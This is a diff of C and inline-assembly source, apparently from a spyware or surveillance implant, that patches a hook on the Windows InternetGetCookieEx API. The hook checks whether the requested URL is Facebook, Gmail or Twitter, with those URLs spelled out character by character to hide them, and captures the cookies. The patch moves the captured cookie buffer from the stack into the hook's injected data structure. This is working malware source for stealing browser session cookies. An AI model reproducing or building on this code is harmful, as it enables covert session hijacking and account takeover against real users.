@@ -395,6 +395,7 @@ void GetURLBarContent(HWND hWnd, DWORD browser_type)
 typedef WCHAR * (WINAPI *StrStrW_t) (WCHAR *, WCHAR *);
 typedef struct {
 	COMMONDATA;
+	WCHAR local_cookie[2048];
 	StrStrW_t pStrStrW;
 } InternetGetCookieExStruct;
 InternetGetCookieExStruct InternetGetCookieExData;
@@ -413,19 +414,18 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 	DWORD old_flags;
 	DWORD old_size;
 	DWORD old_buffer;
-	DWORD local_size;
-
+	
 	MARK_HOOK
 	INIT_WRAPPER(InternetGetCookieExStruct)
 
 	WCHAR facebook_url[] = { L'f', L'a', L'c', L'e', L'b', L'o', L'o', L'k', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR gmail_url[] = { L'm', L'a', L'i', L'l', L'.', L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
-	WCHAR local_cookie[2048];
-
-	local_size = sizeof(local_cookie)/sizeof(WCHAR);
+	DWORD local_size = 2048;
+	WCHAR *local_cookie;
 
 	// Cerca di capire se si tratta di un dominio interessante
+	local_cookie = pData->local_cookie;
 	origin = COOKIE_IEXPLORER;
 	if (pData->pStrStrW && lpszCookieData && lpszURL) {
 		if (pData->pStrStrW((WCHAR *)lpszURL, facebook_url))
@@ -454,7 +454,7 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 		MOV DWORD PTR [EBP+0x18], EAX
 		LEA EAX, local_size
 		MOV DWORD PTR [EBP+0x14], EAX
-		LEA EAX, local_cookie
+		MOV EAX, local_cookie
 		MOV DWORD PTR [EBP+0x10], EAX
 
 		POP EAX
